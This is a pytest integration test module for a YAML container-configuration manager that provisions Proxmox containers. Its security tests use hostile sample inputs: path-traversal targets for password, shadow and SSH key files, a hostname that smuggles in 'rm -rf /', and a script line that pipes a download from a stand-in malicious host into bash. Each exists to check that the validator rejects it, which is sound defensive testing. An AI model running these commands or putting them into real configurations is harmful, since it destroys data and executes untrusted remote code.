"""
Integration tests for YAML configuration management workflows.

This module validates YAML config management functionality including:
- Loading and parsing container configuration files
- Validating configuration schemas and required fields
- Handling configuration inheritance and defaults
- Error handling for malformed or missing configurations
- Integration with container creation and provisioning workflows

Tests follow TDD approach and will fail initially since the implementation
doesn't exist yet. Tests cover the complete config management workflow
from file loading through container creation.

Run with: pytest tests/integration/test_config_management.py -v
"""

import os
import tempfile
import pytest
from unittest.mock import Mock, patch, mock_open
import yaml


class TestConfigManagementIntegration:
    """Integration tests for YAML configuration management workflow."""

    def test_config_manager_service_interface_exists(self):
        """Test that the config manager service interface can be imported (will fail initially)."""
        # This test will fail until the service implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager  # noqa: F401

    @pytest.fixture
    def sample_container_config(self):
        """Sample container configuration for testing."""
        return {
            "container": {
                "hostname": "web-server-01",
                "template": "ubuntu-22.04-standard",
                "node": "pve01",
                "cores": 4,
                "memory": 4096,
                "storage": 20,
                "network": {
                    "interface": "eth0",
                    "bridge": "vmbr0",
                    "ip": "dhcp",
                    "firewall": True
                }
            },
            "provisioning": {
                "install_docker": True,
                "install_tailscale": True,
                "tailscale_auth_key": "${TAILSCALE_AUTH_KEY}",
                "mount_points": [
                    {
                        "host_path": "/srv/data",
                        "container_path": "/data",
                        "readonly": False
                    }
                ],
                "custom_scripts": [
                    "apt-get update && apt-get upgrade -y",
                    "apt-get install -y nginx",
                    "systemctl enable nginx"
                ]
            },
            "metadata": {
                "project": "web-cluster",
                "environment": "production",
                "owner": "devops-team"
            }
        }

    @pytest.fixture
    def sample_config_file_content(self, sample_container_config):
        """Sample YAML configuration file content."""
        return yaml.dump(sample_container_config, default_flow_style=False)

    @pytest.fixture
    def temp_config_file(self, sample_config_file_content):
        """Create temporary config file for testing."""
        with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
            f.write(sample_config_file_content)
            temp_path = f.name

        yield temp_path

        # Cleanup
        if os.path.exists(temp_path):
            os.unlink(temp_path)

    def test_config_loading_from_yaml_file_success(self, temp_config_file, sample_container_config):
        """Test successful loading and parsing of YAML configuration file."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            config_manager = ConfigManager()
            loaded_config = config_manager.load_config(temp_config_file)

            # Verify configuration was loaded correctly
            assert loaded_config is not None
            assert loaded_config["container"]["hostname"] == sample_container_config["container"]["hostname"]
            assert loaded_config["container"]["cores"] == sample_container_config["container"]["cores"]
            assert loaded_config["provisioning"]["install_docker"] == sample_container_config["provisioning"]["install_docker"]

    def test_config_loading_file_not_found_error(self):
        """Test config loading handles missing file error gracefully."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager, ConfigFileNotFoundError

            config_manager = ConfigManager()

            with pytest.raises(ConfigFileNotFoundError) as exc_info:
                config_manager.load_config("/nonexistent/config.yaml")

            assert "not found" in str(exc_info.value).lower()
            assert "/nonexistent/config.yaml" in str(exc_info.value)

    def test_config_loading_invalid_yaml_syntax_error(self):
        """Test config loading handles invalid YAML syntax gracefully."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager, ConfigParseError

            invalid_yaml_content = """
            container:
              hostname: web-server
              cores: 4
              memory: invalid_yaml_syntax: [unclosed_bracket
            """

            with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
                f.write(invalid_yaml_content)
                temp_path = f.name

            try:
                config_manager = ConfigManager()

                with pytest.raises(ConfigParseError) as exc_info:
                    config_manager.load_config(temp_path)

                assert "yaml" in str(exc_info.value).lower()
                assert "syntax" in str(exc_info.value).lower()
            finally:
                os.unlink(temp_path)

    def test_config_schema_validation_success(self, sample_container_config):
        """Test configuration schema validation for valid configuration."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            config_manager = ConfigManager()
            validation_result = config_manager.validate_config(sample_container_config)

            # Verify configuration passes validation
            assert validation_result.is_valid is True
            assert len(validation_result.errors) == 0
            assert validation_result.normalized_config is not None

    def test_config_schema_validation_missing_required_fields(self):
        """Test configuration schema validation detects missing required fields."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager, ConfigValidationError

            incomplete_config = {
                "container": {
                    "hostname": "test-container"
                    # Missing required fields: template, cores, memory, storage
                }
            }

            config_manager = ConfigManager()

            with pytest.raises(ConfigValidationError) as exc_info:
                config_manager.validate_config(incomplete_config)

            error_message = str(exc_info.value).lower()
            assert "required" in error_message
            assert any(field in error_message for field in ["template", "cores", "memory", "storage"])

    def test_config_schema_validation_invalid_field_types(self):
        """Test configuration schema validation detects invalid field types."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager, ConfigValidationError

            invalid_config = {
                "container": {
                    "hostname": "test-container",
                    "template": "ubuntu-22.04-standard",
                    "cores": "four",  # Should be integer
                    "memory": "2GB",  # Should be integer (MB)
                    "storage": True   # Should be integer (GB)
                }
            }

            config_manager = ConfigManager()

            with pytest.raises(ConfigValidationError) as exc_info:
                config_manager.validate_config(invalid_config)

            error_message = str(exc_info.value).lower()
            assert "type" in error_message or "invalid" in error_message

    def test_config_environment_variable_substitution(self):
        """Test configuration supports environment variable substitution."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            config_with_env_vars = {
                "container": {
                    "hostname": "${CONTAINER_HOSTNAME}",
                    "template": "ubuntu-22.04-standard",
                    "cores": 2,
                    "memory": 2048,
                    "storage": 10
                },
                "provisioning": {
                    "tailscale_auth_key": "${TAILSCALE_AUTH_KEY}"
                }
            }

            # Mock environment variables
            with patch.dict(os.environ, {
                'CONTAINER_HOSTNAME': 'dynamic-container-01',
                'TAILSCALE_AUTH_KEY': 'tskey-auth-dynamic123'
            }):
                config_manager = ConfigManager()
                resolved_config = config_manager.resolve_environment_variables(config_with_env_vars)

                # Verify environment variables were substituted
                assert resolved_config["container"]["hostname"] == "dynamic-container-01"
                assert resolved_config["provisioning"]["tailscale_auth_key"] == "tskey-auth-dynamic123"

    def test_config_environment_variable_missing_error(self):
        """Test configuration handles missing environment variables gracefully."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager, EnvironmentVariableError

            config_with_missing_env = {
                "container": {
                    "hostname": "${MISSING_HOSTNAME}",
                    "template": "ubuntu-22.04-standard",
                    "cores": 2,
                    "memory": 2048,
                    "storage": 10
                }
            }

            config_manager = ConfigManager()

            with pytest.raises(EnvironmentVariableError) as exc_info:
                config_manager.resolve_environment_variables(config_with_missing_env)

            assert "MISSING_HOSTNAME" in str(exc_info.value)

    def test_config_defaults_application(self):
        """Test configuration applies sensible defaults for optional fields."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            minimal_config = {
                "container": {
                    "hostname": "minimal-container",
                    "template": "ubuntu-22.04-standard"
                    # Missing optional fields that should get defaults
                }
            }

            config_manager = ConfigManager()
            config_with_defaults = config_manager.apply_defaults(minimal_config)

            # Verify defaults were applied
            assert config_with_defaults["container"]["cores"] == 1  # Default CPU cores
            assert config_with_defaults["container"]["memory"] == 1024  # Default memory (MB)
            assert config_with_defaults["container"]["storage"] == 8  # Default storage (GB)
            assert config_with_defaults["container"]["network"]["ip"] == "dhcp"  # Default networking
            assert config_with_defaults["provisioning"]["install_docker"] is False  # Default provisioning

    def test_config_inheritance_from_template(self):
        """Test configuration supports inheritance from template configurations."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            template_config = {
                "container": {
                    "template": "ubuntu-22.04-standard",
                    "cores": 2,
                    "memory": 2048,
                    "network": {
                        "bridge": "vmbr0",
                        "firewall": True
                    }
                },
                "provisioning": {
                    "install_docker": True,
                    "custom_scripts": [
                        "apt-get update && apt-get upgrade -y"
                    ]
                }
            }

            specific_config = {
                "extends": "web-server-template",
                "container": {
                    "hostname": "web-01",
                    "cores": 4,  # Override template value
                    "storage": 20
                },
                "provisioning": {
                    "install_tailscale": True  # Add to template provisioning
                }
            }

            config_manager = ConfigManager()

            # Mock template loading
            with patch.object(config_manager, 'load_template', return_value=template_config):
                merged_config = config_manager.merge_with_template(specific_config)

                # Verify inheritance and overrides work correctly
                assert merged_config["container"]["hostname"] == "web-01"  # From specific
                assert merged_config["container"]["cores"] == 4  # Override from specific
                assert merged_config["container"]["memory"] == 2048  # From template
                assert merged_config["container"]["template"] == "ubuntu-22.04-standard"  # From template
                assert merged_config["provisioning"]["install_docker"] is True  # From template
                assert merged_config["provisioning"]["install_tailscale"] is True  # From specific

    def test_config_save_to_file_success(self, sample_container_config):
        """Test configuration can be saved to YAML file successfully."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            config_manager = ConfigManager()

            with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
                temp_path = f.name

            try:
                # Save configuration to file
                config_manager.save_config(sample_container_config, temp_path)

                # Verify file was created and contains correct content
                assert os.path.exists(temp_path)

                with open(temp_path, 'r') as f:
                    saved_content = yaml.safe_load(f)

                assert saved_content["container"]["hostname"] == sample_container_config["container"]["hostname"]
                assert saved_content["provisioning"]["install_docker"] == sample_container_config["provisioning"]["install_docker"]
            finally:
                if os.path.exists(temp_path):
                    os.unlink(temp_path)

    def test_config_integration_with_container_creation(self, temp_config_file):
        """Test configuration management integrates with container creation workflow."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager
            from src.cli.commands.create import CreateCommand

            # Mock the create command and its dependencies
            with patch('src.services.proxmox.ProxmoxService') as mock_proxmox:
                with patch('src.services.provisioning.ProvisioningService') as mock_provisioning:

                    # Setup service mocks
                    proxmox_instance = mock_proxmox.return_value
                    proxmox_instance.get_next_vmid.return_value = 101
                    proxmox_instance.create_container.return_value = {
                        'vmid': 101,
                        'task_id': 'task1'
                    }
                    proxmox_instance.wait_for_task.return_value = True
                    proxmox_instance.start_container.return_value = True

                    provisioning_instance = mock_provisioning.return_value
                    provisioning_instance.provision_container.return_value = True

                    # Execute create command with config file
                    create_cmd = CreateCommand()
                    result = create_cmd.run_from_config(config_file=temp_config_file)

                    # Verify configuration was loaded and used for creation
                    assert result['vmid'] == 101
                    assert 'created successfully' in result['message']

                    # Verify proxmox service was called with config values
                    create_call_args = proxmox_instance.create_container.call_args[0][0]
                    assert create_call_args['hostname'] == 'web-server-01'
                    assert create_call_args['cores'] == 4
                    assert create_call_args['memory'] == 4096

    def test_config_validation_with_custom_rules(self):
        """Test configuration validation supports custom business rules."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager, ConfigValidationError

            config_with_violations = {
                "container": {
                    "hostname": "INVALID_HOSTNAME_WITH_UPPERCASE",  # Should be lowercase
                    "template": "ubuntu-22.04-standard",
                    "cores": 32,  # Exceeds reasonable limit
                    "memory": 131072,  # 128GB - exceeds reasonable limit
                    "storage": 1000  # 1TB - exceeds reasonable limit
                }
            }

            config_manager = ConfigManager()

            with pytest.raises(ConfigValidationError) as exc_info:
                config_manager.validate_config(config_with_violations, enforce_limits=True)

            error_message = str(exc_info.value).lower()
            assert any(issue in error_message for issue in ["hostname", "cores", "memory", "storage"])

    def test_config_backup_and_versioning(self, temp_config_file):
        """Test configuration management supports backup and versioning."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            config_manager = ConfigManager()

            # Create backup of existing config
            backup_path = config_manager.create_backup(temp_config_file)

            # Verify backup was created
            assert os.path.exists(backup_path)
            assert backup_path != temp_config_file
            assert "backup" in backup_path or "bak" in backup_path

            # Cleanup
            if os.path.exists(backup_path):
                os.unlink(backup_path)

    def test_config_diff_and_comparison(self, sample_container_config):
        """Test configuration management can compare and diff configurations."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            modified_config = sample_container_config.copy()
            modified_config["container"]["cores"] = 8  # Changed from 4
            modified_config["container"]["memory"] = 8192  # Changed from 4096
            modified_config["provisioning"]["install_nginx"] = True  # Added field

            config_manager = ConfigManager()
            diff_result = config_manager.compare_configs(sample_container_config, modified_config)

            # Verify differences were detected
            assert len(diff_result.changes) > 0
            assert any(change.field == "container.cores" for change in diff_result.changes)
            assert any(change.field == "container.memory" for change in diff_result.changes)
            assert any(change.field == "provisioning.install_nginx" for change in diff_result.changes)


class TestConfigManagementPerformance:
    """Tests for configuration management performance and resource usage."""

    def test_config_loading_performance_large_files(self):
        """Test configuration loading performs well with large configuration files."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            import time
            from src.services.config_manager import ConfigManager

            # Create large configuration with many containers
            large_config = {
                "containers": []
            }

            for i in range(100):
                large_config["containers"].append({
                    "hostname": f"container-{i:03d}",
                    "template": "ubuntu-22.04-standard",
                    "cores": 2,
                    "memory": 2048,
                    "storage": 10,
                    "provisioning": {
                        "install_docker": True,
                        "custom_scripts": [f"echo 'Container {i} setup'"]
                    }
                })

            # Create temporary large config file
            large_config_yaml = yaml.dump(large_config, default_flow_style=False)

            with tempfile.NamedTemporaryFile(mode='w', suffix='.yaml', delete=False) as f:
                f.write(large_config_yaml)
                temp_path = f.name

            try:
                config_manager = ConfigManager()

                # Measure loading time
                start_time = time.time()
                loaded_config = config_manager.load_config(temp_path)
                load_time = time.time() - start_time

                # Verify performance is acceptable (under 5 seconds for 100 containers)
                assert load_time < 5.0
                assert len(loaded_config["containers"]) == 100
            finally:
                os.unlink(temp_path)

    def test_config_memory_usage_efficiency(self):
        """Test configuration management uses memory efficiently."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager

            # This test would verify that the config manager doesn't
            # retain unnecessary references or create memory leaks
            # when processing multiple configurations
            pass


class TestConfigManagementSecurity:
    """Tests for configuration management security aspects."""

    def test_config_prevents_path_traversal_attacks(self):
        """Test configuration loading prevents path traversal attacks."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager, SecurityError

            malicious_paths = [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "/etc/shadow",
                "~/.ssh/id_rsa"
            ]

            config_manager = ConfigManager()

            for malicious_path in malicious_paths:
                with pytest.raises(SecurityError):
                    config_manager.load_config(malicious_path)

    def test_config_sanitizes_user_input(self):
        """Test configuration management sanitizes potentially dangerous input."""
        # This test will fail until implementation exists
        with pytest.raises(ImportError):
            from src.services.config_manager import ConfigManager, ConfigValidationError

            dangerous_config = {
                "container": {
                    "hostname": "test; rm -rf /",  # Command injection attempt
                    "template": "ubuntu-22.04-standard",
                    "cores": 2,
                    "memory": 2048,
                    "storage": 10
                },
                "provisioning": {
                    "custom_scripts": [
                        "curl http://malicious.site/script.sh | bash"  # Dangerous script
                    ]
                }
            }

            config_manager = ConfigManager()

            with pytest.raises(ConfigValidationError):
                config_manager.validate_config(dangerous_config, security_check=True)